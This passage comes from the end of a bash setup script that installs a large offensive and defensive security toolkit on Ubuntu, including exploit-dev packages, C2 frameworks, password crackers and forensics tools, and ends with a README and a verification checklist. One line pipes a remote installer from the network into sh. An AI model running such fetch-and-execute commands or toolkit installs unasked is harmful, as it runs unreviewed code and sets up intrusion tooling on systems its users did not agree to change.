echo "  https://python-can.readthedocs.io/en/stable/"
echo ""
CTFTOOLS
sudo chmod +x /usr/local/bin/ctf-tools

# =============================================================================
# SECTION 17: PYTHON SECURITY LIBRARIES
# =============================================================================
print_section "Python Security Libraries"
for p in impacket scapy pyshark dpkt netaddr paramiko \
         shodan ldap3 pysmb pymysql psycopg2-binary \
         dnspython pyOpenSSL tlslite-ng construct \
         pyserial pyusb can flask fastapi uvicorn \
         sqlalchemy pefile lief r2pipe yara-python \
         python-magic exifread oletools pytsk3; do
    pip_install "$p"
done

# =============================================================================
# SECTION 18: EXPLOIT DEV / EMULATION
# =============================================================================
print_section "Exploit Dev & Emulation"
for pkg in nasm yasm valgrind checksec patchelf \
           gcc-multilib g++-multilib libc6-dev-i386 \
           libseccomp-dev seccomp \
           qemu-user qemu-user-static \
           qemu-system-x86 qemu-system-arm qemu-system-mips; do
    safe_apt_install "$pkg"
done

# =============================================================================
# SECTION 19: MISC QOL TOOLS
# =============================================================================
print_section "QoL & Misc Tools"
for pkg in cherrytree obsidian joplin xclip xdotool \
           recordmydesktop ffmpeg imagemagick \
           zsh zsh-autosuggestions zsh-syntax-highlighting \
           fzf ripgrep bat fd-find ncdu mc ranger \
           hexyl hyperfine; do
    safe_apt_install "$pkg"
done

if [ ! -d "$HOME/.oh-my-zsh" ]; then
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" \
        "" --unattended 2>/dev/null \
        && print_status "Oh My Zsh installed" \
        || print_warning "Oh My Zsh install failed"
fi

# =============================================================================
# SECTION 20: KATOOLIN3 (Kali repos on Ubuntu)
# =============================================================================
print_section "Katoolin3 (Kali repos)"
KATOOLIN_DIR="/opt/katoolin3"
if [ ! -d "$KATOOLIN_DIR" ]; then
    git_clone_tool "https://github.com/s-h-3-l-l/katoolin3.git" "$KATOOLIN_DIR" "katoolin3"
    sudo pip3 install -e "$KATOOLIN_DIR" --break-system-packages --quiet 2>/dev/null \
        && print_status "katoolin3 installed - run 'sudo katoolin3' to install Kali categories" \
        || print_warning "katoolin3 install failed"
fi

# Write top-level README
sudo tee "$BASE/README.md" >/dev/null << 'TOPREADME'
# /opt/security-tools - Security Toolkit Overview

## Quick Commands (run from anywhere)
ctf-tools          - Full CTF cheatsheet in terminal
ctf-decode         - ROT/base64/hex/binary auto-decoder
can-setup          - CAN bus interface guide
esp32-dump         - ESP32 flash dump helper
serial-connect     - Quick serial terminal
i2c-decode         - I2C hex bytes to ASCII
pcap-analyze       - PCAP triage automation
docker-forensics   - Docker image forensics
aperisolve         - Open aperisolve.com steg tool
dcode              - Open dcode.fr cipher tool
cyberchef          - Open CyberChef
kali               - Launch full Kali Linux Docker container
spiderfoot-web     - SpiderFoot OSINT web UI (port 5001)
mobsf              - Mobile Security Framework (port 8000)
frida-server-android [arch]  - Download Android frida server

## Directory Layout
network-recon/     - nmap, masscan, spiderfoot, recon-ng, subfinder, nuclei...
web-testing/       - sqlmap, feroxbuster, dalfox, wpscan, zaproxy, ffuf...
password-cracking/ - hashcat, john, hydra, SecLists, rockyou, pipal...
wifi-hacking/      - aircrack-ng, kismet, wifite, bettercap, hcxtools...
rf-sdr/            - gnuradio, gqrx, urh, hackrf, ubertooth, rtl_433...
canbus/            - can-utils, TruckDevil, ICSim, caringcaribou, UDSim...
hardware-embedded/ - esptool, openocd, avrdude, sigrok, JTAGenum, binwalk...
binary-analysis/   - jadx, ghidra, radare2, gdb+GEF, frida, angr, imhex...
reverse-engineering/ - pwndbg, ROPgadget, capstone, keystone, volatility...
post-exploitation/ - PEASS-ng, PowerSploit, Responder, linpeas, empire...
c2-frameworks/     - Sliver, Empire
digital-forensics/ - sleuthkit, volatility3, bulk_extractor, chainsaw...
blue-team/         - suricata, zeek, snort, yara, sigma, velociraptor...
detection-analysis/ - YARA rules, Sigma rules, scan results, quarantine
mitm-interception/ - mitmproxy, bettercap, ettercap, frida, mitm6...
ctf/               - crypto, pwn, web, forensics, stego tools + READMEs
wordlists/         - SecLists (~1GB), rockyou.txt
exploits/          - ExploitDB mirror

## Each subdirectory has a README.md with tool descriptions and usage examples
## cat /opt/security-tools/<category>/README.md
TOPREADME
print_status "Top-level README written"

# =============================================================================
# VERIFICATION SUMMARY
# =============================================================================
print_header "Installation Verification"

check() {
    local name="$1" cmd="$2"
    if command_exists "$cmd"; then
        print_status "✓ $name"
    else
        print_error  "✗ $name  (not found)"
    fi
}

echo -e "\n${BOLD}Core:${NC}"
check "Python3" python3; check "pip3" pip3; check "Go" go
check "Ruby" ruby; check "Rust/cargo" cargo; check "Node.js" node
check "Java" java; check "VS Code" code; check "Docker" docker; check "tmux" tmux

echo -e "\n${BOLD}Network Recon:${NC}"
check "nmap" nmap; check "masscan" masscan; check "ffuf" ffuf
check "subfinder" subfinder; check "httpx" httpx; check "nuclei" nuclei
check "amass" amass; check "recon-ng" recon-ng
check "spiderfoot" spiderfoot; check "theHarvester" theHarvester

echo -e "\n${BOLD}Web:${NC}"
check "sqlmap" sqlmap; check "wpscan" wpscan
check "feroxbuster" feroxbuster; check "dalfox" dalfox
check "zaproxy" zaproxy; check "gospider" gospider

echo -e "\n${BOLD}Password:${NC}"
check "hashcat" hashcat; check "john" john; check "hydra" hydra
check "medusa" medusa; check "crunch" crunch; check "pipal" pipal

echo -e "\n${BOLD}Exploitation:${NC}"
check "Metasploit" msfconsole; check "searchsploit" searchsploit
check "responder" responder; check "evil-winrm" evil-winrm
check "chisel" chisel; check "ligolo-proxy" ligolo-proxy

echo -e "\n${BOLD}WiFi:${NC}"
check "aircrack-ng" aircrack-ng; check "wifite" wifite
check "reaver" reaver; check "kismet" kismet
check "hcxtools" hcxpcapngtool; check "bettercap" bettercap

echo -e "\n${BOLD}RF/SDR:${NC}"
check "gnuradio" gnuradio-companion; check "gqrx" gqrx
check "rtl_test" rtl_test; check "hackrf_info" hackrf_info
check "urh" urh; check "multimon-ng" multimon-ng
check "inspectrum" inspectrum; check "ubertooth" ubertooth-util
check "sigrok-cli" sigrok-cli; check "morse2ascii" morse2ascii

echo -e "\n${BOLD}CAN Bus:${NC}"
check "candump" candump; check "cansend" cansend
check "cansniffer" cansniffer; check "truckdevil" truckdevil
check "caringcaribou" cc

echo -e "\n${BOLD}Hardware/Embedded:${NC}"
check "esptool" esptool.py; check "avrdude" avrdude
check "openocd" openocd; check "flashrom" flashrom
check "picocom" picocom; check "sigrok-cli" sigrok-cli
check "arduino-cli" arduino-cli; check "platformio" platformio

echo -e "\n${BOLD}Reverse Engineering:${NC}"
check "Ghidra" ghidra; check "radare2" radare2; check "rizin" rizin
check "jadx" jadx; check "jadx-gui" jadx-gui
check "gdb" gdb; check "frida" frida; check "imhex" imhex
check "binwalk" binwalk; check "angr" angr

echo -e "\n${BOLD}Mobile/Android:${NC}"
check "adb" adb; check "frida" frida
check "objection" objection; check "apkleaks" apkleaks
check "mobsf" mobsf

echo -e "\n${BOLD}MITM:${NC}"
check "mitmproxy" mitmproxy; check "bettercap" bettercap
check "ettercap" ettercap; check "mitm6" mitm6

echo -e "\n${BOLD}Forensics:${NC}"
check "volatility3" vol; check "bulk_extractor" bulk_extractor
check "sleuthkit" mmls; check "foremost" foremost
check "exiftool" exiftool; check "chainsaw" chainsaw

echo -e "\n${BOLD}Blue Team:${NC}"
check "suricata" suricata; check "zeek" zeek; check "snort" snort
check "yara" yara; check "sigma-cli" sigma
check "velociraptor" velociraptor; check "clamav" clamscan
check "rkhunter" rkhunter; check "lynis" lynis; check "fail2ban" fail2ban-client

echo -e "\n${BOLD}CTF Helpers:${NC}"
check "ctf-tools" ctf-tools; check "ctf-decode" ctf-decode
check "esp32-dump" esp32-dump; check "serial-connect" serial-connect
check "i2c-decode" i2c-decode; check "can-setup" can-setup
check "pcap-analyze" pcap-analyze; check "aperisolve" aperisolve
check "cyberchef" cyberchef; check "dcode" dcode

snap list 2>/dev/null | grep -q ghidra \
    && print_status "✓ Ghidra (snap)" || print_error "✗ Ghidra"
snap list 2>/dev/null | grep -q android-studio \
    && print_status "✓ Android Studio (snap)" || print_warning "⚠ Android Studio"

echo ""
print_info "Installed: $INSTALLED | Skipped (not in repo): $SKIPPED | Failed: $FAILED"

# =============================================================================
# POST-INSTALL INSTRUCTIONS
# =============================================================================
print_header "Setup Complete!"

cat << 'POSTINSTALL'
━━━ REQUIRED AFTER INSTALL ━━━

1. Reload your shell (PATH changes need this):
     exec $SHELL
   or log out and back in

2. Switch Java versions if needed:
     sudo update-alternatives --config java

3. Configure Wine:
     winecfg

4. CAN bus virtual interface (for testing):
     sudo modprobe vcan
     sudo ip link add dev vcan0 type vcan
     sudo ip link set up vcan0
     can-setup     ← full guide

5. RTL-SDR udev rules (non-root SDR):
     sudo cp /usr/lib/udev/rules.d/rtl-sdr.rules /etc/udev/rules.d/ 2>/dev/null
     sudo udevadm control --reload-rules && sudo udevadm trigger

6. Android Frida server:
     frida-server-android arm64

7. Full Kali toolset via Docker:
     kali

8. More Kali tools interactively:
     sudo katoolin3

━━━ MANUAL DOWNLOADS ━━━

Burp Suite:    https://portswigger.net/burp/communitydownload
IDA Pro:       https://hex-rays.com/ida-pro/
Binary Ninja:  https://binary.ninja/
010 Editor:    https://www.sweetscape.com/010editor/
HttpToolkit:   https://httptoolkit.tech/
Flipper Zero:  https://flipperzero.one/
Proxmark3:     https://github.com/RfidResearchGroup/proxmark3
HackRF fw:     https://github.com/greatscottgadgets/hackrf/releases
VirusTotal API: https://www.virustotal.com/gui/join-us

━━━ EVERY DIRECTORY HAS A README ━━━

cat /opt/security-tools/README.md                 ← Master index
cat /opt/security-tools/network-recon/README.md
cat /opt/security-tools/web-testing/README.md
cat /opt/security-tools/password-cracking/README.md
cat /opt/security-tools/wifi-hacking/README.md
cat /opt/security-tools/rf-sdr/README.md
cat /opt/security-tools/canbus/README.md
cat /opt/security-tools/hardware-embedded/README.md
cat /opt/security-tools/binary-analysis/README.md
cat /opt/security-tools/post-exploitation/README.md
cat /opt/security-tools/digital-forensics/README.md
cat /opt/security-tools/blue-team/README.md
cat /opt/security-tools/ctf/README.md
cat /opt/security-tools/mitm-interception/README.md
cat /opt/security-tools/exploits/README.md

━━━ CTF QUICK START ━━━

ctf-tools       ← Full cheatsheet in your terminal

POSTINSTALL

print_header "Happy Hacking (legally)! 🔐"
